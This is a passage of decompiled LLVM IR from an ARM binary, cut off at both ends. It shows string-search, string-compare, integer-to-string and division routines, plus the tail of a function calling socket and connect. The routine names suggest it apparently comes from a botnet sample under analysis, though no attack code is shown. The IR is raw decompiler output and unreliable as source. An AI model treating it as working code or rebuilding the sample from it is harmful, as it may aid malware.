  uselistorder i32 %v3_10224, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 6, 7, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 18, 19, 16, 17, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i32 ()* @__GI___errno_location, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10284, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_10294 = load i8, i8* %tmp, align 1
  %v4_10294 = zext i8 %v3_10294 to i32
  store i32 %v4_10294, i32* @r3, align 4
  %v2_10298 = icmp eq i8 %v3_10294, 0
  br i1 %v2_10298, label %bb, label %dec_label_pc_102ac

bb:                                               ; preds = %entry
  br label %dec_label_pc_102c0

dec_label_pc_102ac:                               ; preds = %entry
  br label %dec_label_pc_102b0

dec_label_pc_102b0:                               ; preds = %dec_label_pc_102b0, %dec_label_pc_102ac
  %v0_102b0 = phi i32 [ %v1_102b0, %dec_label_pc_102b0 ], [ 0, %dec_label_pc_102ac ]
  %v1_102b0 = add i32 %v0_102b0, 1
  %v2_102b4 = add i32 %v1_102b0, %arg2
  %v3_102b4 = inttoptr i32 %v2_102b4 to i8*
  %v4_102b4 = load i8, i8* %v3_102b4, align 1
  %v6_102b4 = zext i8 %v4_102b4 to i32
  store i32 %v6_102b4, i32* @r3, align 4
  %v2_102b8 = icmp eq i8 %v4_102b4, 0
  br i1 %v2_102b8, label %dec_label_pc_102c0, label %dec_label_pc_102b0

dec_label_pc_102c0:                               ; preds = %dec_label_pc_102b0, %bb
  %v0_1030421 = phi i32 [ %v4_10294, %bb ], [ %v1_102b0, %dec_label_pc_102b0 ]
  %v0_102c82 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_102c82, 1
  br i1 %tmp29, label %dec_label_pc_10318, label %dec_label_pc_102d4

dec_label_pc_102d4:                               ; preds = %dec_label_pc_102c0, %dec_label_pc_102c8.backedge
  %v0_102cc.in = phi i32 [ %v0_102cc, %dec_label_pc_102c8.backedge ], [ %v0_102c82, %dec_label_pc_102c0 ]
  %v1_102e0 = phi i32 [ %v1_102e015, %dec_label_pc_102c8.backedge ], [ 0, %dec_label_pc_102c0 ]
  %v0_102d4 = phi i32 [ %v5_102d4, %dec_label_pc_102c8.backedge ], [ %tmp23, %dec_label_pc_102c0 ]
  %v0_102cc = add i32 %v0_102cc.in, -1
  %v1_102d4 = inttoptr i32 %v0_102d4 to i8*
  %v2_102d4 = load i8, i8* %v1_102d4, align 1
  %v3_102d4 = zext i8 %v2_102d4 to i32
  %v5_102d4 = add i32 %v0_102d4, 1
  %v1_102d8 = add nsw i32 %v3_102d4, -65
  %v2_102e0 = add i32 %v1_102e0, %arg2
  %v3_102e0 = inttoptr i32 %v2_102e0 to i8*
  %v4_102e0 = load i8, i8* %v3_102e0, align 1
  %v6_102e0 = zext i8 %v4_102e0 to i32
  store i32 %v6_102e0, i32* @r3, align 4
  %v1_102e4 = add nsw i32 %v6_102e0, -65
  %tmp38 = icmp ult i32 %v1_102d8, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_102d4
  %v5_102e8 = or i32 %v3_102d4, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_102d4, %bb30
  %v0_102f4 = phi i32 [ %v3_102d4, %dec_label_pc_102d4 ], [ %v5_102e8, %bb30 ]
  %tmp39 = icmp ult i32 %v1_102e4, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_102f0 = or i32 %v6_102e0, 96
  store i32 %v5_102f0, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_102f4 = phi i32 [ %v6_102e0, %bb31 ], [ %v5_102f0, %bb32 ]
  %v9_102f4 = icmp eq i32 %v0_102f4, %v1_102f4
  br i1 %v9_102f4, label %dec_label_pc_10300, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_102c8.backedge

dec_label_pc_102c8.backedge:                      ; preds = %bb34, %dec_label_pc_10300
  %v1_102e015 = phi i32 [ 0, %bb34 ], [ %v1_10300, %dec_label_pc_10300 ]
  %tmp35 = icmp slt i32 %v0_102cc, 1
  br i1 %tmp35, label %dec_label_pc_10318, label %dec_label_pc_102d4

dec_label_pc_10300:                               ; preds = %bb33
  %v1_10300 = add i32 %v1_102e0, 1
  %v9_10304 = icmp eq i32 %v0_1030421, %v1_10300
  br i1 %v9_10304, label %dec_label_pc_1030c, label %dec_label_pc_102c8.backedge

dec_label_pc_1030c:                               ; preds = %dec_label_pc_10300
  %v2_1030c = sub i32 %v5_102d4, %tmp23
  br label %dec_label_pc_10318

dec_label_pc_10318:                               ; preds = %dec_label_pc_102c8.backedge, %dec_label_pc_102c0, %dec_label_pc_1030c
  %storemerge = phi i32 [ %v2_1030c, %dec_label_pc_1030c ], [ -1, %dec_label_pc_102c0 ], [ -1, %dec_label_pc_102c8.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10300, { 1, 0 }
  uselistorder i32 %v0_102d4, { 1, 0 }
  uselistorder i32 %v1_102e0, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 7, 6, 8, 3, 9, 4, 10, 5, 11, 12 }
  uselistorder label %dec_label_pc_10318, { 2, 0, 1 }
  uselistorder label %dec_label_pc_102c8.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_102d4, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10320 = load i8, i8* %arg1, align 1
  %v2_10324 = icmp eq i8 %v2_10320, 0
  br i1 %v2_10324, label %bb, label %dec_label_pc_10330

bb:                                               ; preds = %entry
  %v3_10320 = zext i8 %v2_10320 to i32
  br label %dec_label_pc_10344

dec_label_pc_10330:                               ; preds = %entry
  br label %dec_label_pc_10334

dec_label_pc_10334:                               ; preds = %dec_label_pc_10334, %dec_label_pc_10330
  %v0_10334 = phi i32 [ %v1_10334, %dec_label_pc_10334 ], [ 0, %dec_label_pc_10330 ]
  %v1_10334 = add i32 %v0_10334, 1
  %v2_10338 = add i32 %v1_10334, %tmp
  %v3_10338 = inttoptr i32 %v2_10338 to i8*
  %v4_10338 = load i8, i8* %v3_10338, align 1
  %v2_1033c = icmp eq i8 %v4_10338, 0
  br i1 %v2_1033c, label %dec_label_pc_10344, label %dec_label_pc_10334

dec_label_pc_10344:                               ; preds = %dec_label_pc_10334, %bb
  %v0_103903 = phi i32 [ %v3_10320, %bb ], [ %v1_10334, %dec_label_pc_10334 ]
  %v1_10344 = inttoptr i32 %arg2 to i8*
  %v2_10344 = load i8, i8* %v1_10344, align 1
  %v3_10344 = zext i8 %v2_10344 to i32
  store i32 %v3_10344, i32* @r3, align 4
  %v2_10348 = icmp eq i8 %v2_10344, 0
  br i1 %v2_10348, label %bb21, label %dec_label_pc_10354

bb21:                                             ; preds = %dec_label_pc_10344
  store i32 %v3_10344, i32* @r2, align 4
  br label %dec_label_pc_10368

dec_label_pc_10354:                               ; preds = %dec_label_pc_10344
  br label %dec_label_pc_10358

dec_label_pc_10358:                               ; preds = %dec_label_pc_10358, %dec_label_pc_10354
  %v0_10358 = phi i32 [ %v1_10358, %dec_label_pc_10358 ], [ 0, %dec_label_pc_10354 ]
  %v1_10358 = add i32 %v0_10358, 1
  store i32 %v1_10358, i32* @r2, align 4
  %v2_1035c = add i32 %v1_10358, %arg2
  %v3_1035c = inttoptr i32 %v2_1035c to i8*
  %v4_1035c = load i8, i8* %v3_1035c, align 1
  %v6_1035c = zext i8 %v4_1035c to i32
  store i32 %v6_1035c, i32* @r3, align 4
  %v2_10360 = icmp eq i8 %v4_1035c, 0
  br i1 %v2_10360, label %dec_label_pc_10368, label %dec_label_pc_10358

dec_label_pc_10368:                               ; preds = %dec_label_pc_10358, %bb21
  %v0_10368 = phi i32 [ %v3_10344, %bb21 ], [ %v1_10358, %dec_label_pc_10358 ]
  %v9_10368 = icmp eq i32 %v0_10368, %v0_103903
  br i1 %v9_10368, label %dec_label_pc_10390.preheader, label %dec_label_pc_10370

dec_label_pc_10390.preheader:                     ; preds = %dec_label_pc_10368
  %v2_103905 = icmp eq i32 %v0_103903, 0
  br i1 %v2_103905, label %dec_label_pc_10398, label %dec_label_pc_10378

dec_label_pc_10370:                               ; preds = %dec_label_pc_10378, %dec_label_pc_10368
  ret i32 0

dec_label_pc_10378:                               ; preds = %dec_label_pc_10388, %dec_label_pc_10390.preheader
  %v0_10390.in = phi i32 [ %v0_10390, %dec_label_pc_10388 ], [ %v0_103903, %dec_label_pc_10390.preheader ]
  %v0_1038c = phi i32 [ %v1_1038c, %dec_label_pc_10388 ], [ %arg2, %dec_label_pc_10390.preheader ]
  %v0_10388 = phi i32 [ %v1_10388, %dec_label_pc_10388 ], [ %tmp, %dec_label_pc_10390.preheader ]
  %v0_10390 = add i32 %v0_10390.in, -1
  %v1_10378 = inttoptr i32 %v0_10388 to i8*
  %v2_10378 = load i8, i8* %v1_10378, align 1
  %v3_10378 = zext i8 %v2_10378 to i32
  store i32 %v3_10378, i32* @r2, align 4
  %v1_1037c = inttoptr i32 %v0_1038c to i8*
  %v2_1037c = load i8, i8* %v1_1037c, align 1
  %v3_1037c = zext i8 %v2_1037c to i32
  store i32 %v3_1037c, i32* @r3, align 4
  %v9_10380 = icmp eq i8 %v2_10378, %v2_1037c
  br i1 %v9_10380, label %dec_label_pc_10388, label %dec_label_pc_10370

dec_label_pc_10388:                               ; preds = %dec_label_pc_10378
  %v1_10388 = add i32 %v0_10388, 1
  %v1_1038c = add i32 %v0_1038c, 1
  %v2_10390 = icmp eq i32 %v0_10390, 0
  br i1 %v2_10390, label %dec_label_pc_10398, label %dec_label_pc_10378

dec_label_pc_10398:                               ; preds = %dec_label_pc_10388, %dec_label_pc_10390.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10358, { 0, 1, 3, 2 }
  uselistorder i8 %v2_10320, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_103a4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_103a4, i32* %r8.global-to-local, align 4
  %v2_103a4 = icmp eq i32 %v0_103a4, 0
  store i1 %v2_103a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_103a4, label %dec_label_pc_10484, label %dec_label_pc_103b4

dec_label_pc_103b4:                               ; preds = %entry
  %v3_103b4 = icmp eq i8 %arg1, 0
  store i1 %v3_103b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_103b4, label %.thread, label %dec_label_pc_103c8

.thread:                                          ; preds = %dec_label_pc_103b4
  %v4_103bc = inttoptr i32 %v0_103a4 to i8*
  store i8 48, i8* %v4_103bc, align 1
  %v0_103c0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_103c0.pr.pr, label %.thread1, label %dec_label_pc_103c8

.thread1:                                         ; preds = %.thread
  %v4_103c0 = load i32, i32* %r8.global-to-local, align 4
  %v5_103c0 = add i32 %v4_103c0, 1
  %v6_103c0 = inttoptr i32 %v5_103c0 to i8*
  store i8 0, i8* %v6_103c0, align 1
  %v0_103c4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_103c4.pr.pr, label %dec_label_pc_10484, label %dec_label_pc_103c8

dec_label_pc_103c8:                               ; preds = %dec_label_pc_103b4, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_103cc = icmp eq i32 %arg2, 10
  store i1 %v7_103cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103cc, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_103c8
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_103c8
  %v4_103c8 = zext i1 %tmp48 to i32
  store i32 %v4_103c8, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_103ec8 = sub nsw i32 0, %tmp
  %tmp.v3_103ec8 = select i1 %phitmp, i32 %tmp, i32 %v3_103ec8
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_103ec8, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_103f8 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_103f8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_103fc

dec_label_pc_103fc:                               ; preds = %bb46, %.thread6
  %v2_1041c = phi i32 [ %v1_10428, %bb46 ], [ 32, %.thread6 ]
  %v0_10410 = phi i32 [ %v2_10420, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_10400 = load i32, i32* %r6.global-to-local, align 4
  %v3_10404 = urem i32 %v0_10410, %v0_10400
  store i32 %v3_10404, i32* %r1.global-to-local, align 4
  %v7_10408 = icmp eq i32 %v3_10404, 9
  store i1 %v7_10408, i1* %cpsr_z.global-to-local, align 1
  %v1_1040c = add i32 %v3_10404, 48
  store i32 %v0_10410, i32* %r0.global-to-local, align 4
  %v7_10414 = icmp sgt i32 %v3_10404, 9
  %extract.t = trunc i32 %v1_1040c to i8
  br i1 %v7_10414, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_103fc
  %v9_10414 = add i32 %v3_10404, 55
  %extract.t28 = trunc i32 %v9_10414 to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_103fc, %bb45
  %v0_1041c.off0 = phi i8 [ %extract.t, %dec_label_pc_103fc ], [ %extract.t28, %bb45 ]
  store i32 %v0_10400, i32* %r1.global-to-local, align 4
  %v3_1041c = load i32, i32* %r7.global-to-local, align 4
  %v4_1041c = add i32 %v3_1041c, %v2_1041c
  %v5_1041c = inttoptr i32 %v4_1041c to i8*
  store i8 %v0_1041c.off0, i8* %v5_1041c, align 1
  %v0_10420 = load i32, i32* %r0.global-to-local, align 4
  %v1_10420 = load i32, i32* %r1.global-to-local, align 4
  %v2_10420 = udiv i32 %v0_10420, %v1_10420
  store i32 %v2_10420, i32* %r0.global-to-local, align 4
  %v2_10424 = icmp ugt i32 %v1_10420, %v0_10420
  store i1 %v2_10424, i1* %cpsr_z.global-to-local, align 1
  %v0_10428 = load i32, i32* %r5.global-to-local, align 4
  %v1_10428 = add i32 %v0_10428, -1
  store i32 %v1_10428, i32* %r5.global-to-local, align 4
  br i1 %v2_10424, label %dec_label_pc_10430, label %dec_label_pc_103fc

dec_label_pc_10430:                               ; preds = %bb46
  %v0_10430 = load i32, i32* %sl.global-to-local, align 4
  %v2_10430 = icmp eq i32 %v0_10430, 0
  store i1 %v2_10430, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10430, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_10430
  %v3_10434 = ptrtoint i32* %stack_var_-32 to i32
  %v3_10438 = add i32 %v1_10428, %v3_10434
  store i32 %v3_10438, i32* %r2.global-to-local, align 4
  %v4_10440 = add i32 %v3_10438, -34
  %v5_10440 = inttoptr i32 %v4_10440 to i8*
  store i8 45, i8* %v5_10440, align 1
  %v0_10444.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_10444.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_10444.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_10430
  %v1_10444 = phi i32 [ %v1_10428, %dec_label_pc_10430 ], [ %v1_10444.pre, %.thread11 ]
  %v2_10444 = add i32 %v1_10444, 1
  store i32 %v2_10444, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_10450 = phi i32 [ %v2_10444, %.thread12 ], [ %v1_10444.pre, %.thread11 ]
  %v0_10448 = load i32, i32* %r7.global-to-local, align 4
  %v2_10448 = add i32 %v0_10448, %v1_10450
  %v3_10448 = inttoptr i32 %v2_10448 to i8*
  %v4_10448 = load i8, i8* %v3_10448, align 1
  %v6_10448 = zext i8 %v4_10448 to i32
  %v2_1044c = icmp eq i8 %v4_10448, 0
  store i1 %v2_1044c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_10448, i32* %r2.global-to-local, align 4
  br i1 %v2_1044c, label %dec_label_pc_10494, label %dec_label_pc_1045c.preheader

dec_label_pc_1045c.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1045c

dec_label_pc_1045c:                               ; preds = %dec_label_pc_1045c.preheader, %dec_label_pc_1045c
  %v0_1045c = phi i32 [ 0, %dec_label_pc_1045c.preheader ], [ %v1_1045c, %dec_label_pc_1045c ]
  %v1_1045c = add i32 %v0_1045c, 1
  store i32 %v1_1045c, i32* %r1.global-to-local, align 4
  %v2_10460 = add i32 %v1_1045c, %v2_10448
  %v3_10460 = inttoptr i32 %v2_10460 to i8*
  %v4_10460 = load i8, i8* %v3_10460, align 1
  %v2_10464 = icmp eq i8 %v4_10460, 0
  store i1 %v2_10464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10464, label %dec_label_pc_1046c, label %dec_label_pc_1045c

dec_label_pc_1046c:                               ; preds = %dec_label_pc_1045c, %dec_label_pc_10494
  %v0_1047025 = phi i32 [ %v6_10448, %dec_label_pc_10494 ], [ %v1_1045c, %dec_label_pc_1045c ]
  %v0_1046c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1046c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10470

dec_label_pc_10470:                               ; preds = %dec_label_pc_10470.dec_label_pc_10470_crit_edge, %dec_label_pc_1046c
  %v2_1047c = phi i32 [ %v5_1047c, %dec_label_pc_10470.dec_label_pc_10470_crit_edge ], [ %v0_1046c, %dec_label_pc_1046c ]
  %v0_10474 = phi i32 [ %v0_10474.pre, %dec_label_pc_10470.dec_label_pc_10470_crit_edge ], [ %v2_10448, %dec_label_pc_1046c ]
  %v0_10470 = phi i32 [ %v0_10470.pre, %dec_label_pc_10470.dec_label_pc_10470_crit_edge ], [ %v0_1047025, %dec_label_pc_1046c ]
  %v1_10470 = add i32 %v0_10470, -1
  store i32 %v1_10470, i32* %r1.global-to-local, align 4
  %v1_10474 = inttoptr i32 %v0_10474 to i8*
  %v2_10474 = load i8, i8* %v1_10474, align 1
  %v5_10474 = add i32 %v0_10474, 1
  store i32 %v5_10474, i32* %r2.global-to-local, align 4
  %v3_10478 = icmp eq i32 %v0_10470, 0
  store i1 %v3_10478, i1* %cpsr_z.global-to-local, align 1
  %v3_1047c = inttoptr i32 %v2_1047c to i8*
  store i8 %v2_10474, i8* %v3_1047c, align 1
  %v4_1047c = load i32, i32* %r0.global-to-local, align 4
  %v5_1047c = add i32 %v4_1047c, 1
  store i32 %v5_1047c, i32* %r0.global-to-local, align 4
  br i1 %v3_10478, label %dec_label_pc_10484, label %dec_label_pc_10470.dec_label_pc_10470_crit_edge

dec_label_pc_10470.dec_label_pc_10470_crit_edge:  ; preds = %dec_label_pc_10470
  %v0_10470.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_10474.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10470

dec_label_pc_10484:                               ; preds = %dec_label_pc_10470, %.thread1, %entry
  %v0_10484 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10484, i32* %r0.global-to-local, align 4
  ret i32 %v0_10484

dec_label_pc_10494:                               ; preds = %.thread11._crit_edge
  store i32 %v6_10448, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1046c

; uselistorder directives
  uselistorder i32 %v5_1047c, { 1, 0 }
  uselistorder i1 %v3_10478, { 1, 0 }
  uselistorder i32 %v0_10474, { 1, 0 }
  uselistorder i32 %v1_1045c, { 0, 1, 3, 2 }
  uselistorder i32 %v6_10448, { 1, 0 }
  uselistorder i32 %v2_10448, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10444.pre, { 1, 0 }
  uselistorder i32 %v1_10428, { 1, 0, 3, 2 }
  uselistorder i32 %v2_10420, { 1, 0 }
  uselistorder i32 %v3_10404, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_103a4, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1046c, { 1, 0 }
  uselistorder label %dec_label_pc_1045c, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_103c8, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_1049c = load i32, i32* @r1, align 4
  %v1_1049c = add i32 %v0_1049c, -1
  store i32 %v1_1049c, i32* %r2.global-to-local, align 4
  %v2_1049c = icmp eq i32 %v0_1049c, 0
  %v7_1049c = icmp eq i32 %v0_1049c, 1
  %v0_104a0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_1049c, i32 %v0_104a0)
  br i1 %v2_1049c, label %dec_label_pc_10584, label %dec_label_pc_104a8

dec_label_pc_104a8:                               ; preds = %entry
  %v0_104a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_104a8 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_104a8, %v1_104a8
  br i1 %tmp, label %dec_label_pc_104b0, label %dec_label_pc_1053c

dec_label_pc_104b0:                               ; preds = %dec_label_pc_104a8
  %v1_104b0 = load i32, i32* %r2.global-to-local, align 4
  %v2_104b0 = and i32 %v1_104b0, %v1_104a8
  %v4_104b0 = icmp eq i32 %v2_104b0, 0
  br i1 %v4_104b0, label %dec_label_pc_10548, label %dec_label_pc_104b8

dec_label_pc_104b8:                               ; preds = %dec_label_pc_104b0
  %v3_104b8 = icmp ult i32 %v1_104a8, 536870912
  br i1 %v3_104b8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_104b8
  %v4_104bc = mul i32 %v1_104a8, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_104b8, %.thread
  %v0_104dc.pr36.ph = phi i32 [ %v4_104bc, %.thread ], [ %v1_104a8, %dec_label_pc_104b8 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_104b8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_104dc.pr36 = phi i32 [ %v4_104d0, %bb81 ], [ %v0_104dc.pr36.ph, %.preheader.preheader ]
  %v1_104d4 = phi i32 [ %v4_104d4, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_104c8 = icmp ugt i32 %v0_104dc.pr36, 268435455
  br i1 %v2_104c8, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_104dcthread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_104cc = icmp ult i32 %v0_104dc.pr36, %v0_104a8
  br i1 %v4_104cc, label %bb80, label %dec_label_pc_104dcthread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_104d0 = and i32 %v0_104dc.pr36, 268435456
  %v3_104d0 = icmp eq i32 %v2_104d0, 0
  %v4_104d0 = mul i32 %v0_104dc.pr36, 16
  br i1 %v3_104d0, label %bb81, label %dec_label_pc_104dc.loopexit

bb81:                                             ; preds = %bb80
  %v2_104d4 = and i32 %v1_104d4, 268435456
  %v3_104d4 = icmp eq i32 %v2_104d4, 0
  %v4_104d4 = mul i32 %v1_104d4, 16
  br i1 %v3_104d4, label %.preheader, label %dec_label_pc_104dcthread-pre-split.loopexit.loopexit

dec_label_pc_104dcthread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_104e848.ph = phi i32 [ %v1_104d4, %bb ], [ %v4_104d4, %bb81 ]
  %v0_104dc.pr38.ph = phi i32 [ %v0_104dc.pr36, %bb ], [ %v4_104d0, %bb81 ]
  br label %dec_label_pc_104dcthread-pre-split.loopexit

dec_label_pc_104dcthread-pre-split.loopexit:      ; preds = %dec_label_pc_104dcthread-pre-split.loopexit.loopexit, %.thread2
  %v1_104e848 = phi i32 [ %v1_104d4, %.thread2 ], [ %v1_104e848.ph, %dec_label_pc_104dcthread-pre-split.loopexit.loopexit ]
  %v0_104dc.pr38 = phi i32 [ %v0_104dc.pr36, %.thread2 ], [ %v0_104dc.pr38.ph, %dec_label_pc_104dcthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_104dcthread-pre-split

dec_label_pc_104dcthread-pre-split:               ; preds = %dec_label_pc_104dcthread-pre-split.loopexit, %bb83
  %v1_104e846 = phi i32 [ %v1_104e848, %dec_label_pc_104dcthread-pre-split.loopexit ], [ %v3_104e8, %bb83 ]
  %v0_104dc.pr = phi i32 [ %v0_104dc.pr38, %dec_label_pc_104dcthread-pre-split.loopexit ], [ %v3_104e4, %bb83 ]
  br label %dec_label_pc_104dc

dec_label_pc_104dc.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_104dc

dec_label_pc_104dc:                               ; preds = %dec_label_pc_104dc.loopexit, %dec_label_pc_104dcthread-pre-split
  %v1_104e8 = phi i32 [ %v1_104e846, %dec_label_pc_104dcthread-pre-split ], [ %v1_104d4, %dec_label_pc_104dc.loopexit ]
  %v1_104e4 = phi i32 [ %v0_104dc.pr, %dec_label_pc_104dcthread-pre-split ], [ %v4_104d0, %dec_label_pc_104dc.loopexit ]
  %v2_104dc = icmp slt i32 %v1_104e4, 0
  br i1 %v2_104dc, label %dec_label_pc_104f0, label %bb82

bb82:                                             ; preds = %dec_label_pc_104dc
  %v4_104e0 = icmp ult i32 %v1_104e4, %v0_104a8
  br i1 %v4_104e0, label %bb83, label %dec_label_pc_104f0

bb83:                                             ; preds = %bb82
  %v3_104e4 = mul i32 %v1_104e4, 2
  %v2_104e8 = icmp slt i32 %v1_104e8, 0
  %v3_104e8 = mul i32 %v1_104e8, 2
  br i1 %v2_104e8, label %dec_label_pc_104f0, label %dec_label_pc_104dcthread-pre-split

dec_label_pc_104f0:                               ; preds = %bb82, %dec_label_pc_104dc, %bb83
  %v2_104fc59 = phi i32 [ %v3_104e8, %bb83 ], [ %v1_104e8, %bb82 ], [ %v1_104e8, %dec_label_pc_104dc ]
  %v1_104f451 = phi i32 [ %v3_104e4, %bb83 ], [ %v1_104e4, %bb82 ], [ %v1_104e4, %dec_label_pc_104dc ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_104f4

dec_label_pc_104f4:                               ; preds = %.thread11, %dec_label_pc_104f0
  %v1_10528 = phi i32 [ %v4_10528, %.thread11 ], [ %v2_104fc59, %dec_label_pc_104f0 ]
  %v1_104fc = phi i32 [ %v0_10534, %.thread11 ], [ 0, %dec_label_pc_104f0 ]
  %v1_1052c = phi i32 [ %v4_1052c, %.thread11 ], [ %v1_104f451, %dec_label_pc_104f0 ]
  %v1_104f8 = phi i32 [ %v0_10524, %.thread11 ], [ %v0_104a8, %dec_label_pc_104f0 ]
  %v3_104f4 = icmp ult i32 %v1_104f8, %v1_1052c
  br i1 %v3_104f4, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_104f4
  %v3_104f8 = sub i32 %v1_104f8, %v1_1052c
  store i32 %v3_104f8, i32* %r0.global-to-local, align 4
  %v3_104fc = or i32 %v1_104fc, %v1_10528
  store i32 %v3_104fc, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_104f4, %bb84
